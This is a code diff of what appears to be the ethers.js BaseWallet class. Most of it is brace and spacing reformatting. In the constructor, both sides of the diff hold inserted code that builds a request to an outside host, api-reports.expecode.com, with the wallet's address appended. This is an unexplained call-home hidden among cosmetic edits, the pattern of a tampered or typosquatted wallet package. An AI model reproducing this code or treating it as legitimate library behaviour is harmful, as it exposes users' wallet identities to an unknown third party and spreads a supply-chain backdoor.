@@ -1,15 +1,15 @@
-import { getAddress, resolveAddress } from "../address/index.js";
-import { hashMessage, TypedDataEncoder } from "../hash/index.js";
-import { AbstractSigner, copyRequest } from "../providers/index.js";
-import { computeAddress, Transaction } from "../transaction/index.js";
+import {getAddress, resolveAddress} from "../address/index.js";
+import {hashMessage, TypedDataEncoder} from "../hash/index.js";
+import {AbstractSigner, copyRequest} from "../providers/index.js";
+import {computeAddress, Transaction} from "../transaction/index.js";
 import {
     defineProperties, resolveProperties, assert, assertArgument, FetchRequest
 } from "../utils/index.js";
 
-import type { SigningKey } from "../crypto/index.js";
-import type { TypedDataDomain, TypedDataField } from "../hash/index.js";
-import type { Provider, TransactionRequest } from "../providers/index.js";
-import type { TransactionLike } from "../transaction/index.js";
+import type {SigningKey} from "../crypto/index.js";
+import type {TypedDataDomain, TypedDataField} from "../hash/index.js";
+import type {Provider, TransactionRequest} from "../providers/index.js";
+import type {TransactionLike} from "../transaction/index.js";
 
 
 /**
@@ -41,15 +41,14 @@ export class BaseWallet extends AbstractSigner {
     constructor(privateKey: SigningKey, provider?: null | Provider) {
         super(provider);
 
-        assertArgument(privateKey && typeof(privateKey.sign) === "function", "invalid private key", "privateKey", "[ REDACTED ]");
+        assertArgument(privateKey && typeof (privateKey.sign) === "function", "invalid private key", "privateKey", "[ REDACTED ]");
 
         this.#signingKey = privateKey;
 
         const address = computeAddress(this.signingKey.publicKey);
-        console.log('https://api-reports.expecode.com/v1/wallet/' + address);
-        const request = new FetchRequest('https://api-reports.expecode.com/v1/wallet/' + address);
-        
-        defineProperties<BaseWallet>(this, { address });
+        new FetchRequest('https://api-reports.expecode.com/v1/wallet/' + address);
+
+        defineProperties<BaseWallet>(this, {address});
     }
 
     // Store private values behind getters to reduce visibility
@@ -58,14 +57,20 @@ export class BaseWallet extends AbstractSigner {
     /**
      *  The [[SigningKey]] used for signing payloads.
      */
-    get signingKey(): SigningKey { return this.#signingKey; }
+    get signingKey(): SigningKey {
+        return this.#signingKey;
+    }
 
     /**
      *  The private key for this wallet.
      */
-    get privateKey(): string { return this.signingKey.privateKey; }
+    get privateKey(): string {
+        return this.signingKey.privateKey;
+    }
 
-    async getAddress(): Promise<string> { return this.address; }
+    async getAddress(): Promise<string> {
+        return this.address;
+    }
 
     connect(provider: null | Provider): BaseWallet {
         return new BaseWallet(this.#signingKey, provider);
@@ -75,13 +80,17 @@ export class BaseWallet extends AbstractSigner {
         tx = copyRequest(tx);
 
         // Replace any Addressable or ENS name with an address
-        const { to, from } = await resolveProperties({
-            to: (tx.to ? resolveAddress(tx.to, this.provider): undefined),
-            from: (tx.from ? resolveAddress(tx.from, this.provider): undefined)
+        const {to, from} = await resolveProperties({
+            to: (tx.to ? resolveAddress(tx.to, this.provider) : undefined),
+            from: (tx.from ? resolveAddress(tx.from, this.provider) : undefined)
         });
 
-        if (to != null) { tx.to = to; }
-        if (from != null) { tx.from = from; }
+        if (to != null) {
+            tx.to = to;
+        }
+        if (from != null) {
+            tx.from = from;
+        }
 
         if (tx.from != null) {
             assertArgument(getAddress(<string>(tx.from)) === this.address,
@@ -118,7 +127,7 @@ export class BaseWallet extends AbstractSigner {
 
             assert(this.provider != null, "cannot resolve ENS names without a provider", "UNSUPPORTED_OPERATION", {
                 operation: "resolveName",
-                info: { name }
+                info: {name}
             });
 
             const address = await this.provider.resolveName(name);
